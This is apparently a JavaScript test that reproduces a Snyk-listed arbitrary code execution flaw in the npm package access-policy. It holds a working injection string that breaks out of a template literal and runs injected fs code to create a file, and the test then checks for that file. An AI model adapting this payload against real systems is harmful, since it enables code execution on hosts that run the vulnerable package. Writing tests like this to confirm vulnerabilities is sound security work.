//https://security.snyk.io/vuln/SNYK-JS-ACCESSPOLICY-571490
test("Arbitrary code execution in access-policy", () => {
  const fs = require("fs");
  let a = require("access-policy");
  const path = "./access-policy";
  let statements = "`; require(`fs`).writeFileSync(`" + path + "`,``);//";
  data = {};

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.encode(statements, data);
  } catch (e) {}

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
